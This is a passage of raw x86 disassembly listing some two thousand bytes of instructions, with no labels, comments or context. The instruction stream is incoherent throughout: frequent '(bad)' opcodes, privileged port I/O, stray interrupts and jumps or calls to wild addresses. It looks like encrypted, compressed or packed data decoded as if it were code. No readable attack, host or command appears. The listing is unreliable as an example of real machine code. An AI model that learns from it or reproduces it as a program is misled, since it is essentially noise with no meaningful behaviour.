  41903b:	clc    
  41903c:	fsubr  st,st(6)
  41903e:	cmp    al,0x11
  419040:	in     al,dx
  419041:	push   eax
  419042:	gs enter 0x8a9f,0xaf
  419047:	push   ebp
  419048:	mov    eax,0xc2962916
  41904d:	jne    0x419028
  41904f:	jb     0x41903c
  419051:	push   edi
  419052:	sub    dl,ah
  419054:	in     eax,0x21
  419056:	pop    ebp
  419057:	aam    0x55
  419059:	ins    BYTE PTR es:[edi],dx
  41905a:	mov    ebp,DWORD PTR [edx+edi*4-0x285f876a]
  419061:	test   DWORD PTR [eax+ebx*1],0xbbb39963
  419068:	je     0x41909c
  41906a:	sbb    eax,0x7d9bb3f3
  41906f:	sub    al,BYTE PTR [edi]
  419071:	xor    al,0x2e
  419073:	xchg   ebp,eax
  419074:	cmp    eax,0xfbb2b6fd
  419079:	imul   esi,DWORD PTR [eax],0xa5a32990
  41907f:	ret    
  419080:	fs push ebx
  419082:	aam    0x6
  419084:	pop    ebx
  419085:	pop    esi
  419086:	mov    esi,0x4b3502c8
  41908b:	dec    ebp
  41908c:	mov    al,ds:0x151461fb
  419091:	push   sp
  419093:	sar    DWORD PTR [ecx+0xea2eb2],1
  419099:	js     0x41909b
  41909b:	mov    al,ds:0xcd61e909
  4190a0:	rcr    DWORD PTR [ecx],cl
  4190a2:	jmp    DWORD PTR [edx+0x359d16cd]
  4190a8:	leave  
  4190a9:	inc    edi
  4190aa:	push   ss
  4190ab:	mov    al,0xb0
  4190ad:	icebp  
  4190ae:	adc    bl,BYTE PTR [eax-0x4acee147]
  4190b4:	sbb    dh,BYTE PTR [ecx-0x401cc8b2]
  4190ba:	or     DWORD PTR [edi+0x20],esi
  4190bd:	push   0xe8821ace
  4190c2:	cwde   
  4190c3:	test   BYTE PTR [ebp-0x20868a11],0x64
  4190ca:	ret    0xc38c
  4190cd:	mov    eax,0x7ac8fa20
  4190d2:	add    esi,DWORD PTR [ebx]
  4190d4:	les    esi,FWORD PTR [eax+0x11]
  4190d7:	push   esi
  4190d8:	(bad)  
  4190da:	push   ss
  4190db:	xchg   bh,bh
  4190dd:	cwde   
  4190de:	scas   al,BYTE PTR es:[edi]
  4190df:	retf   
  4190e0:	or     eax,0x1a960b0e
  4190e5:	inc    ebp
  4190e6:	test   DWORD PTR ds:0xa75ff1cc,edx
  4190ec:	push   ebx
  4190ed:	xchg   BYTE PTR [edx-0x4f9eab4c],dl
  4190f3:	jmp    0x419124
  4190f5:	or     eax,ecx
  4190f7:	push   edx
  4190f8:	int    0x97
  4190fa:	rol    DWORD PTR [esi+0x4d],0xc3
  4190fe:	and    eax,0x44b9ea1f
  419103:	or     edx,DWORD PTR [ebp+esi*8-0x12]
  419107:	jo     0x419183
  419109:	rcl    BYTE PTR [ecx],0xd9
  41910c:	cmp    bl,BYTE PTR [eax+0x1b]
  41910f:	dec    ecx
  419110:	mov    al,ds:0x2edd0808
  419115:	daa    
  419116:	mov    ah,0xf8
  419118:	out    dx,al
  419119:	jge    0x419151
  41911b:	pop    ds
  41911c:	icebp  
  41911d:	fidivr DWORD PTR [edi]
  41911f:	inc    esp
  419120:	mov    dh,BYTE PTR [edi]
  419122:	ins    BYTE PTR es:[edi],dx
  419123:	jb     0x4190c2
  419125:	pop    ds
  419126:	sbb    al,BYTE PTR [ebx]
  419128:	les    eax,FWORD PTR ds:0x2843678
  41912e:	nop
  41912f:	stos   BYTE PTR es:[edi],al
  419130:	mov    ecx,0xde27be57
  419135:	pop    ds
  419136:	jp     0x4190fd
  419138:	scas   eax,DWORD PTR es:[di]
  41913a:	push   eax
  41913b:	jle    0x4191b0
  41913d:	lea    ebx,[edi+0x5454bc71]
  419143:	loope  0x419162
  419145:	stos   BYTE PTR es:[edi],al
  419146:	adc    eax,0x7d912e9b
  41914b:	(bad)  
  41914c:	scas   eax,DWORD PTR es:[edi]
  41914d:	fstp   QWORD PTR [ebp+0x26d67066]
  419153:	popf   
  419154:	rcl    BYTE PTR [edx+0xebe7961],cl
  41915a:	in     al,dx
  41915b:	dec    eax
  41915c:	mov    ds:0x851a3a33,al
  419161:	inc    esi
  419162:	aaa    
  419163:	ja     0x41918f
  419165:	sbb    eax,0x66725316
  41916a:	add    ch,BYTE PTR [ecx+0x79c1579a]
  419170:	jp     0x4191a2
  419172:	xor    edi,DWORD PTR [ecx+0x5324258b]
  419178:	push   esp
  419179:	mov    ecx,0x99ca6857
  41917e:	pop    ds
  41917f:	je     0x41916f
  419181:	xor    ebx,DWORD PTR [eax+0x37417956]
  419187:	sbb    al,0x4
  419189:	call   0x309b7f97
  41918e:	call   0x5023d3e2
  419193:	xchg   DWORD PTR [esi],eax
  419195:	test   al,0x69
  419197:	pop    ebx
  419198:	clc    
  419199:	xor    BYTE PTR ds:0x44c43756,ch
  41919f:	jmp    0x4191ed
  4191a1:	sub    DWORD PTR [edi-0x47],ebx
  4191a4:	xor    eax,ebp
  4191a6:	data16 outs dx,BYTE PTR ds:[esi]
  4191a8:	aaa    
  4191a9:	inc    edx
  4191aa:	and    al,0x8
  4191ac:	arpl   WORD PTR [ecx-0x7],dx
  4191af:	xlat   BYTE PTR ds:[ebx]
  4191b0:	sbb    al,0xaf
  4191b2:	or     dh,BYTE PTR ds:0xa3746589
  4191b8:	fild   DWORD PTR [esi]
  4191ba:	je     0x41916f
  4191bc:	sahf   
  4191bd:	sub    eax,0xbe037cdb
  4191c2:	test   al,0x60
  4191c4:	xor    DWORD PTR [esi-0x63],0xb4c4c7b4
  4191cb:	or     eax,0xaa94585c
  4191d0:	out    dx,al
  4191d1:	jno    0x419241
  4191d3:	stc    
  4191d4:	loope  0x41921c
  4191d6:	out    dx,eax
  4191d7:	add    DWORD PTR [edi+0x20f3bfd5],edx
  4191dd:	mov    BYTE PTR [edi-0x277f4c90],cl
  4191e3:	(bad)  
  4191e4:	mov    eax,0x187dea5f
  4191e9:	mov    bh,0x20
  4191eb:	ret    
  4191ec:	dec    ebx
  4191ed:	je     0xdb7e302
  4191f3:	hlt    
  4191f4:	jns    0x419270
  4191f6:	cmp    esi,DWORD PTR [eax]
  4191f8:	iret   
  4191f9:	ficom  WORD PTR [ecx+0x3b]
  4191fc:	add    BYTE PTR [ecx+0x277cd677],al
  419202:	or     DWORD PTR [edi+edx*1],0xc63152be
  419209:	xlat   BYTE PTR ds:[ebx]
  41920a:	sar    DWORD PTR [ecx+0x286b6ca5],1
  419210:	add    eax,0xd7d81de9
  419215:	mov    eax,0x4749cf6b
  41921a:	imul   BYTE PTR [esi+ecx*4]
  41921d:	jl     0x41926b
  41921f:	test   ebx,edx
  419221:	adc    BYTE PTR [ecx+eax*8-0x6956e9f7],dl
  419228:	jle    0x4191f0
  41922a:	xlat   BYTE PTR ds:[ebx]
  41922b:	inc    ebp
  41922c:	imul   DWORD PTR [eax-0x25]
  41922f:	fisttp QWORD PTR [esi+0x63]
  419232:	fist   DWORD PTR ds:[edi-0x1bc73c93]
  419239:	ss add bl,cl
  41923c:	jb     0x4191db
  41923e:	mov    WORD PTR [esi+esi*4+0x39],gs
  419242:	shl    DWORD PTR [edi],1
  419244:	out    0x17,al
  419246:	pop    eax
  419247:	xor    al,0xfa
  419249:	jae    0x419290
  41924b:	ficomp WORD PTR [ebp-0x1f]
  41924e:	bnd jmp 0x4191e1
  419251:	or     BYTE PTR [edx+0x44931863],dl
  419257:	out    dx,eax
  419258:	bound  ebx,QWORD PTR [ebp+ebp*2+0x1d]
  41925c:	call   0x12a2cd67
  419261:	aam    0x2f
  419263:	(bad)  [ebx+ecx*4+0x32]
  419267:	mov    BYTE PTR [ebp-0x22a57cb8],dl
  41926d:	xor    DWORD PTR [ebx-0x78daa77a],0x35ffdbf0
  419277:	push   cs
  419278:	lea    esp,[edi]
  41927a:	xor    eax,0x96672f29
  41927f:	mov    ds:0xed80c589,al
  419284:	pushf  
  419285:	sub    eax,0xa2edd5a1
  41928a:	mov    eax,ds:0x6940e70a
  41928f:	inc    ecx
  419290:	imul   BYTE PTR [ebx]
  419292:	lock lods eax,DWORD PTR ds:[esi]
  419294:	push   es
  419295:	mov    cl,0x1d
  419297:	call   0xbcd9:0x85ef0223
  41929e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41929f:	mov    ebx,DWORD PTR [eax+0x17ea4194]
  4192a5:	push   ebx
  4192a6:	es add al,0x72
  4192a9:	loope  0x419253
  4192ab:	pusha  
  4192ac:	push   ebx
  4192ad:	mov    ds:0x7066b881,al
  4192b2:	std    
  4192b3:	mov    WORD PTR [ebx-0x43],gs
  4192b6:	and    DWORD PTR [ebp+0x7f98e968],esi
  4192bc:	or     al,0xfd
  4192be:	cli    
  4192bf:	daa    
  4192c0:	inc    edi
  4192c1:	add    eax,0x3890ce4f
  4192c6:	pusha  
  4192c7:	in     al,dx
  4192c8:	icebp  
  4192c9:	sub    esp,DWORD PTR [ecx+0x3369f3ac]
  4192cf:	dec    ebp
  4192d0:	mov    ds:0x6506785,eax
  4192d5:	stc    
  4192d6:	mov    edx,0x3ffbf294
  4192db:	or     eax,0x2af2602a
  4192e0:	pop    es
  4192e1:	hlt    
  4192e2:	xor    ecx,DWORD PTR [esi+ebx*8]
  4192e5:	int3   
  4192e6:	rcr    BYTE PTR [esi],cl
  4192e8:	les    ebp,FWORD PTR fs:[eax-0x5a]
  4192ec:	rol    ch,1
  4192ee:	sbb    BYTE PTR [ebx],ah
  4192f0:	mov    cl,0x17
  4192f2:	fcmovne st,st(3)
  4192f4:	or     eax,0x4f1554ce
  4192f9:	xchg   ebp,eax
  4192fa:	xor    DWORD PTR [edi-0x67],0xa563571b
  419301:	outs   dx,DWORD PTR ds:[esi]
  419302:	(bad)  
  419303:	nop
  419304:	xchg   ebp,eax
  419305:	icebp  
  419306:	ja     0x419344
  419308:	dec    edx
  419309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41930a:	push   esi
  41930b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41930c:	dec    eax
  41930d:	pop    eax
  41930e:	inc    esi
  41930f:	call   0x3a5e6a98
  419314:	imul   ebx,DWORD PTR [esi-0x47ca7b94],0xe8380b84
  41931e:	int    0xd6
  419320:	pop    ebx
  419321:	ret    0x94fb
  419324:	xchg   ebx,eax
  419325:	test   al,0x27
  419327:	in     al,dx
  419328:	and    eax,eax
  41932a:	sahf   
  41932b:	dec    bh
  41932d:	les    esi,FWORD PTR [ecx+0x2de6e1c7]
  419333:	xor    esi,DWORD PTR [ebp+edx*2-0x70]
  419337:	retf   
  419338:	push   0x934aa282
  41933d:	xchg   edx,eax
  41933e:	aaa    
  41933f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419340:	mov    dl,0xbe
  419342:	int3   
  419343:	push   es
  419344:	inc    eax
  419345:	push   esi
  419346:	cmp    edx,DWORD PTR [eax+edx*2]
  419349:	and    eax,0xf6120531
  41934e:	mov    DWORD PTR [ecx-0xe],esp
  419351:	add    edi,DWORD PTR [eax-0x78]
  419354:	mov    BYTE PTR [ecx],0x2b
  419357:	gs data16 jns 0x41930e
  41935b:	lods   eax,DWORD PTR ds:[esi]
  41935c:	pop    edx
  41935d:	xchg   esi,eax
  41935e:	in     al,dx
  41935f:	jmp    0x70c5379a
  419364:	adc    edx,DWORD PTR ds:0x5018f53e
  41936a:	rcl    BYTE PTR [edi-0x7884b74b],1
  419370:	cs data16 jecxz 0x419339
  419374:	mov    al,ds:0x2832517e
  419379:	mov    eax,0x57c19001
  41937e:	sti    
  41937f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419380:	mov    dh,0xe7
  419382:	daa    
  419383:	ins    BYTE PTR es:[edi],dx
  419384:	push   0xfffffffb
  419386:	scas   al,BYTE PTR es:[edi]
  419387:	ret    0x187c
  41938a:	ds push 0x40
  41938d:	inc    edi
  41938e:	mov    DWORD PTR [ebp-0x7e009b45],edi
  419394:	pop    ebx
  419395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419396:	sub    al,0xd4
  419398:	xor    dh,BYTE PTR [ebx-0x5e149911]
  41939e:	add    dl,dh
  4193a0:	shl    ebx,1
  4193a2:	lock inc ecx
  4193a4:	mov    BYTE PTR [ebx-0x7a],dl
  4193a7:	xchg   ebp,eax
  4193a8:	cs xor al,0xa4
  4193ab:	aas    
  4193ac:	jle    0x419343
  4193ae:	xchg   dh,al
  4193b0:	aaa    
  4193b1:	(bad)  
  4193b2:	stos   DWORD PTR es:[edi],eax
  4193b3:	bound  ebx,QWORD PTR [eax-0x4]
  4193b6:	loop   0x419436
  4193b8:	and    ch,BYTE PTR [ecx]
  4193ba:	cmp    al,0x7e
  4193bc:	call   0x7a4b285
  4193c1:	dec    esp
  4193c2:	push   edi
  4193c3:	jno    0x419381
  4193c5:	fisubr DWORD PTR [ecx-0x2b26ee60]
  4193cb:	jmp    DWORD PTR [edi-0x62]
  4193ce:	lea    esi,[edi-0x6a]
  4193d1:	cdq    
  4193d2:	adc    al,0x95
  4193d4:	dec    esp
  4193d5:	mov    ebx,0xcc44e997
  4193da:	stos   BYTE PTR es:[edi],al
  4193db:	sahf   
  4193dc:	aad    0x8
  4193de:	in     eax,0x4c
  4193e0:	mov    ds:0xab4401b0,eax
  4193e5:	fcmovu st,st(1)
  4193e7:	xchg   ebp,eax
  4193e8:	xor    bl,ch
  4193ea:	mov    dl,0x45
  4193ec:	fwait
  4193ed:	add    BYTE PTR [esi-0x22de7c31],dh
  4193f3:	gs lock cli 
  4193f6:	outs   dx,BYTE PTR ds:[esi]
  4193f7:	dec    ebp
  4193f8:	sahf   
  4193f9:	js     0x4193a5
  4193fb:	nop
  4193fc:	sbb    DWORD PTR [esi-0x5a3c088],esi
  419402:	in     eax,dx
  419403:	jne    0x419476
  419405:	adc    BYTE PTR [edx-0x44],al
  419408:	mov    al,ds:0xad550272
  41940d:	push   es
  41940e:	int    0x1f
  419410:	xchg   esp,eax
  419411:	cmp    BYTE PTR [ecx+0x5e],bl
  419414:	jnp    0x4193f7
  419416:	shl    DWORD PTR [esi-0x401b2871],cl
  41941c:	xor    DWORD PTR [ebp+0x7fba2a2c],edx
  419422:	sub    DWORD PTR [ebx+0x10367f2],edi
  419428:	test   eax,0xfa16798d
  41942d:	add    eax,0xf031ccae
  419432:	popa   
  419433:	cmp    ecx,ecx
  419435:	in     al,dx
  419436:	push   ecx
  419437:	(bad)  
  419438:	mov    eax,ds:0xda2acb7c
  41943d:	and    al,0xb3
  41943f:	dec    ecx
  419440:	jp     0x4193f1
  419442:	cmp    ecx,DWORD PTR [edi-0x3b]
  419445:	mov    ds:0xc86d582c,al
  41944a:	xor    dl,dh
  41944c:	pop    ebx
  41944d:	and    eax,0x611a5003
  419452:	pop    es
  419453:	sub    dh,BYTE PTR [esi]
  419455:	mov    dh,0x2e
  419457:	xchg   ecx,eax
  419458:	push   edx
  419459:	push   edi
  41945a:	test   BYTE PTR [edi+0x20eb9037],bh
  419460:	ret    
  419461:	div    BYTE PTR [ecx-0x42457db3]
  419467:	cdq    
  419468:	stc    
  419469:	mov    ebx,0xa436a1aa
  41946e:	push   ds
  41946f:	dec    ebp
  419470:	dec    edi
  419471:	push   ebp
  419472:	sub    BYTE PTR [esp+esi*1],al
  419475:	xor    DWORD PTR fs:[edx-0x19855d03],ecx
  41947c:	lahf   
  41947d:	cmc    
  41947e:	imul   ebx,DWORD PTR [esi+0x76],0x64d5ffb0
  419485:	not    DWORD PTR [eax-0x57]
  419488:	jle    0x419441
  41948a:	(bad)  
  41948c:	dec    edi
  41948d:	sar    ah,1
  41948f:	mov    WORD PTR [edx],gs
  419491:	or     al,0xf3
  419493:	lods   al,BYTE PTR es:[esi]
  419495:	jp     0x4194d1
  419497:	mov    edx,0x12333c4a
  41949c:	in     al,0x7f
  41949e:	jl     0x419421
  4194a0:	pop    ecx
  4194a1:	sbb    al,ch
  4194a3:	pop    eax
  4194a4:	(bad)  
  4194a5:	adc    BYTE PTR [esi+0x652a6e5b],ah
  4194ab:	jp     0x4194a6
  4194ad:	aaa    
  4194ae:	stos   BYTE PTR es:[edi],al
  4194af:	inc    ebp
  4194b0:	fidivr WORD PTR [eax]
  4194b2:	in     al,dx
  4194b3:	data16 das 
  4194b5:	aas    
  4194b6:	mov    edx,0x2383a560
  4194bb:	mov    BYTE PTR [edx],bl
  4194bd:	or     ax,0xab57
  4194c1:	push   0x16007d4d
  4194c6:	jmp    0x4194ac
  4194c8:	pop    ebp
  4194c9:	pop    edx
  4194ca:	sbb    BYTE PTR [ebp+0x67],0x2d
  4194ce:	test   esp,edi
  4194d0:	daa    
  4194d1:	dec    eax
  4194d2:	push   ss
  4194d3:	sub    eax,0x8fb8fa28
  4194d8:	cs hlt 
  4194da:	js     0x419549
  4194dc:	pop    esp
  4194dd:	add    edx,edx
  4194df:	fwait
  4194e0:	sbb    edx,DWORD PTR [esi+eax*4-0x6c4d6647]
  4194e7:	mov    edi,0x7d2f852a
  4194ec:	pop    esp
  4194ed:	push   es
  4194ee:	sahf   
  4194ef:	loopne 0x419508
  4194f1:	push   ebp
  4194f2:	push   ebx
  4194f3:	push   cs
  4194f4:	cs bound esp,QWORD PTR gs:[eax]
  4194f8:	and    BYTE PTR [edx],al
  4194fa:	int    0x6e
  4194fc:	pop    edi
  4194fd:	jo     0x4194aa
  4194ff:	mov    ecx,0x6ee8ff23
  419504:	retf   0xa6d4
  419507:	(bad)  
  419508:	inc    edi
  41950a:	pop    edi
  41950b:	test   al,0xf9
  41950d:	cmp    dl,al
  41950f:	ror    BYTE PTR [ebp+0x68e19869],1
  419515:	cdq    
  419516:	jge    0x41952d
  419518:	addr16 cmc 
  41951a:	dec    edi
  41951b:	jle    0x4194e7
  41951d:	adc    BYTE PTR [edi+0x48],0x81
  419521:	shl    BYTE PTR [edx],0xa7
  419524:	cmp    eax,DWORD PTR [esp+edi*1-0x1545f61]
  41952b:	xchg   ebp,eax
  41952c:	mul    bh
  41952e:	test   BYTE PTR [eax+0x4],dl
  419531:	jecxz  0x419517
  419533:	pop    esp
  419534:	mov    ecx,ebx
  419536:	push   edx
  419537:	nop
  419538:	mov    bh,0x70
  41953a:	push   cs
  41953b:	fiadd  WORD PTR fs:[eax-0x7884f0fa]
  419542:	mov    eax,ds:0x750d724d
  419547:	int3   
  419548:	imul   ecx,DWORD PTR [ebp-0x49],0x57
  41954c:	leave  
  41954d:	dec    edi
  41954e:	add    dl,bl
  419550:	out    0x91,eax
  419552:	and    eax,0x12698cb
  419557:	or     dl,ah
  419559:	or     eax,0x8116fb35
  41955e:	adc    ebx,DWORD PTR [esi+0x1d]
  419561:	inc    ecx
  419562:	push   esi
  419563:	xchg   esp,eax
  419564:	imul   esp,DWORD PTR [ebp+0x5686fb5c],0xc
  41956b:	pop    ecx
  41956c:	sub    ebp,edi
  41956e:	jne    0x41959d
  419570:	mov    BYTE PTR [esi+0x51305319],al
  419576:	imul   BYTE PTR [ecx-0x5b]
  419579:	rol    edx,cl
  41957b:	call   0xa6fda155
  419580:	xor    DWORD PTR [esi-0x4b7aff9],0x2ef7106d
  41958a:	clc    
  41958b:	shl    ah,1
  41958d:	(bad)  
  41958e:	out    dx,eax
  41958f:	push   edx
  419590:	mov    ds:0xc042c139,eax
  419595:	mov    WORD PTR [eax-0x48675532],gs
  41959b:	mov    al,BYTE PTR [edi-0x425b109]
  4195a1:	xchg   edx,eax
  4195a2:	fst    st(0)
  4195a4:	dec    ecx
  4195a5:	ss dec eax
  4195a7:	(bad)  
  4195a8:	adc    eax,0xe18e4e51
  4195ad:	outs   dx,DWORD PTR ds:[esi]
  4195ae:	mov    eax,ds:0x896cd134
  4195b3:	popf   
  4195b4:	fadd   DWORD PTR [eax]
  4195b6:	(bad)  
  4195b7:	sbb    BYTE PTR [eax],cl
  4195b9:	sbb    ebp,DWORD PTR [ebx+edx*2]
  4195bc:	(bad)  
  4195bd:	enter  0x2389,0x56
  4195c1:	sahf   
  4195c2:	mov    edi,DWORD PTR [ecx+ecx*1-0x1d5bed5f]
  4195c9:	loop   0x4195d2
  4195cb:	pop    ds
  4195cc:	xchg   ecx,eax
  4195cd:	test   al,0x91
  4195cf:	fsubr  QWORD PTR [ebp-0x44]
  4195d2:	scas   eax,DWORD PTR es:[edi]
  4195d3:	fnstsw WORD PTR [ecx+0x6ceb2a79]
  4195d9:	mov    dl,0xc2
  4195db:	mov    bh,0x58
  4195dd:	scas   eax,DWORD PTR es:[edi]
  4195de:	sub    al,0x12
  4195e0:	jmp    0x45eaad49
  4195e5:	(bad)  
  4195e6:	sbb    DWORD PTR [ebp-0x349e310],edx
  4195ec:	jecxz  0x4195e6
  4195ee:	ja     0x4195f4
  4195f0:	mov    ah,0xb8
  4195f2:	push   0x6e01fa72
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	in     eax,0xd0
  4195fb:	pusha  
  4195fc:	daa    
  4195fd:	shl    BYTE PTR [ebp+0x4a1dbd4d],1
  419603:	(bad)  
  419605:	dec    eax
  419606:	inc    DWORD PTR [eax-0x55903344]
  41960c:	xchg   esp,eax
  41960d:	fnstsw WORD PTR [edi-0x50]
  419610:	shl    DWORD PTR [edx-0x1fdfb746],0xc7
  419617:	aad    0x2b
  419619:	daa    
  41961a:	add    ebp,esi
  41961c:	imul   BYTE PTR [edx-0x21fae0a8]
  419622:	stc    
  419623:	sbb    eax,DWORD PTR [eax+esi*8-0x24]
  419627:	cmc    
  419628:	mov    esi,0x9d3d5d03
  41962d:	or     eax,0x374c67e
  419632:	mov    eax,0x2d79da08
  419637:	pop    esp
  419638:	mov    al,0xb6
  41963a:	js     0x4195dd
  41963c:	xlat   BYTE PTR ds:[ebx]
  41963d:	outs   dx,BYTE PTR ds:[esi]
  41963e:	jle    0x41969c
  419640:	add    dh,BYTE PTR [edx+0x47cc83c0]
  419646:	adc    al,0x82
  419648:	and    DWORD PTR [edi-0x226601d4],esi
  41964e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41964f:	cmp    al,0x1c
  419651:	ja     0x41962b
  419653:	prefetch BYTE PTR [edi+eiz*1]
  419657:	(bad)  [ecx]
  419659:	mov    ds:0x50eee321,eax
  41965e:	dec    eax
  41965f:	je     0x4196df
  419661:	ror    DWORD PTR [ebp+0x4e],cl
  419664:	mov    ecx,0xfccfbaa8
  419669:	popf   
  41966a:	sbb    BYTE PTR [edi-0xe],bl
  41966d:	mov    edi,0xee851a55
  419672:	(bad)  
  419673:	push   ebp
  419674:	cmp    edi,edi
  419676:	into   
  419677:	jne    0x41960f
  419679:	imul   esi,DWORD PTR ds:0x113e40d5,0xfffffff3
  419680:	loop   0x41962e
  419682:	pop    edi
  419683:	jne    0x419697
  419685:	sbb    esp,DWORD PTR [edi+0x74]
  419688:	sub    al,0x42
  41968a:	mov    BYTE PTR [eax+edi*2-0x1ca55148],ah
  419691:	pop    esp
  419692:	cmp    eax,0xf33981e9
  419697:	mov    eax,esi
  419699:	and    al,0x5
  41969b:	inc    eax
  41969c:	hlt    
  41969d:	je     0x419622
  41969f:	add    eax,0xc9604b78
  4196a4:	(bad)  
  4196a5:	xlat   BYTE PTR ds:[ebx]
  4196a6:	sbb    ah,dl
  4196a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a9:	mov    cl,0xef
  4196ab:	pusha  
  4196ac:	out    0x77,al
  4196ae:	dec    ecx
  4196af:	inc    ebp
  4196b0:	mov    ds:0x5877e167,al
  4196b5:	repz push cs
  4196b7:	call   FWORD PTR [eax+0x74b2697]
  4196bd:	sub    cl,BYTE PTR [ecx-0x80]
  4196c0:	popa   
  4196c1:	add    DWORD PTR [eax+0x62],ebx
  4196c4:	data16 arpl WORD PTR [edi+0x98f988a],si
  4196cb:	call   FWORD PTR [eax]
  4196cd:	in     eax,0x83
  4196cf:	mov    al,0xaf
  4196d1:	repz ror DWORD PTR [edx],cl
  4196d4:	push   cs
  4196d5:	inc    ecx
  4196d6:	sbb    al,0xb1
  4196d8:	shl    DWORD PTR [edx],cl
  4196da:	xor    edi,edx
  4196dc:	mov    ebp,0x5ddbf63f
  4196e1:	js     0x4196bb
  4196e3:	(bad)  
  4196e4:	sbb    ecx,edi
  4196e6:	and    eax,0x78d976a1
  4196eb:	cld    
  4196ec:	(bad)  
  4196ed:	stc    
  4196ee:	test   al,0x3b
  4196f0:	sar    DWORD PTR [ebp-0x3a592bfc],0x8f
  4196f7:	scas   eax,DWORD PTR es:[edi]
  4196f8:	cld    
  4196f9:	mov    ds:0xb2a5eb22,al
  4196fe:	stos   BYTE PTR es:[edi],al
  4196ff:	add    BYTE PTR [esi],dl
  419701:	sbb    al,0xb0
  419703:	push   edx
  419704:	push   edx
  419705:	sub    eax,0xef0f2950
  41970a:	jg     0x419758
  41970c:	pop    esi
  41970d:	push   eax
  41970e:	dec    esp
  41970f:	mov    eax,ebx
  419711:	xlat   BYTE PTR ds:[ebx]
  419712:	lods   al,BYTE PTR ds:[esi]
  419713:	push   ds
  419714:	ss inc esp
  419716:	cmp    ecx,0xffffff86
  419719:	mov    ds:0x2ec67fc3,eax
  41971e:	sbb    al,0xe5
  419720:	push   cs
  419721:	mov    esp,ebp
  419723:	je     0x419767
  419725:	mov    edx,0xca3a76e4
  41972a:	aad    0x27
  41972c:	ror    al,0xfc
  41972f:	push   es
  419730:	sub    esi,ebp
  419732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419733:	sub    al,0xb7
  419735:	test   eax,0xcfc54488
  41973a:	leave  
  41973b:	mov    ebp,0xe3082778
  419740:	jns    0x4196c4
  419742:	jecxz  0x4197b7
  419744:	clc    
  419745:	leave  
  419746:	(bad)  
  419747:	xor    DWORD PTR [ecx+esi*4+0x78f15f2f],edx
  41974e:	dec    ebx
  41974f:	mov    BYTE PTR cs:[ecx],bh
  419752:	cmp    ah,BYTE PTR [esi+esi*1]
  419755:	xor    ah,ch
  419757:	push   es
  419758:	cli    
  419759:	xor    al,dh
  41975b:	pusha  
  41975c:	aas    
  41975d:	ficomp DWORD PTR [edx+0x7bc1fd26]
  419763:	mov    BYTE PTR [ebx+eiz*8+0x22bc77ea],0xa1
  41976b:	mov    edi,0x2466a5d6
  419770:	rol    dh,1
  419772:	jl     0x419763
  419774:	fsubr  DWORD PTR [ecx-0xedbca5d]
  41977a:	and    DWORD PTR [ecx],ecx
  41977c:	or     DWORD PTR fs:[edx-0x4a],eax
  419780:	push   esp
  419781:	and    bl,0xb1
  419784:	and    DWORD PTR [esi+eiz*4],ebp
  419787:	and    dh,bl
  419789:	mov    BYTE PTR [ebp-0x26],cl
  41978c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41978d:	loop   0x4197ea
  41978f:	(bad)  
  419790:	sub    esi,DWORD PTR [ebp-0x3f]
  419793:	(bad)  
  419794:	and    BYTE PTR [edi+0x3be1c96],dh
  41979a:	jnp    0x4197f1
  41979c:	ret    0x577d
  41979f:	dec    edx
  4197a0:	enter  0x86df,0xc2
  4197a4:	aad    0xdf
  4197a6:	push   ds
  4197a7:	push   edx
  4197a8:	leave  
  4197a9:	xchg   sp,ax
  4197ab:	stos   DWORD PTR es:[edi],eax
  4197ac:	mov    ebp,0x51f9ecfe
  4197b1:	mul    BYTE PTR [ecx+0x77]
  4197b4:	sub    bl,BYTE PTR ds:0xfb07cb6
  4197ba:	in     eax,0xc1
  4197bc:	fld    QWORD PTR [edx+0x1]
  4197bf:	(bad)  [edi-0x57]
  4197c2:	jle    0x4197a4
  4197c4:	xor    DWORD PTR [ecx-0x53],0xffffffb9
  4197c8:	jno    0x4197d4
  4197ca:	cwde   
  4197cb:	outs   dx,DWORD PTR ds:[esi]
  4197cc:	mov    ebx,edi
  4197ce:	cmp    ah,bl
  4197d0:	loopne 0x4197c1
  4197d2:	dec    esp
  4197d3:	push   ss
  4197d4:	xchg   edx,eax
  4197d5:	cmp    DWORD PTR [edx],ebx
  4197d7:	jle    0x4197f6
  4197d9:	ror    esi,1
  4197db:	xor    edi,edx
  4197dd:	imul   ebp,DWORD PTR [esi],0x3e9aed70
  4197e3:	ficom  WORD PTR [edi-0x4]
  4197e6:	mov    esi,0x4cf89dc0
  4197eb:	outs   dx,DWORD PTR ds:[esi]
  4197ec:	arpl   WORD PTR [eax-0x611f1eae],si
  4197f2:	mov    al,0x13
  4197f4:	mov    WORD PTR [ecx-0xe8eb2a1],cs
  4197fa:	xor    eax,0x9b072cce
  4197ff:	inc    ecx
  419800:	and    BYTE PTR ds:0xb1b9b54d,ah
  419806:	push   es
  419807:	aad    0xd
  419809:	mov    ds:0xd1cd7446,eax
  41980e:	mov    ebp,0x8be2a8a2
  419813:	into   
  419814:	dec    ebx
  419815:	push   ecx
  419816:	jne    0x419800
  419818:	fdivr  DWORD PTR [ebp+eax*1+0x4d601948]
  41981f:	retf   0x8de1
  419822:	clc    
  419823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419824:	outs   dx,DWORD PTR ds:[esi]
  419825:	nop
  419826:	or     eax,0x94d2f2f3
  41982b:	add    al,BYTE PTR [ecx]
  41982d:	jne    0x4197f4
  41982f:	(bad)  [eax-0x43]
  419832:	rcl    DWORD PTR [ebp-0x6c],1
  419835:	hlt    
  419836:	sti    
  419837:	add    BYTE PTR [esi-0x1],cl
  41983a:	ror    esi,1
  41983c:	dec    ebx
  41983d:	adc    bl,cl
  41983f:	pop    ecx
  419840:	and    edi,DWORD PTR [ebx-0xd344578]
  419846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419847:	and    dl,BYTE PTR [edx+0x4ff9e8b8]
  41984d:	in     eax,0xe6
  41984f:	xchg   ebp,eax
  419850:	cdq    
  419851:	and    esi,DWORD PTR [ecx]
  419853:	pop    ebp
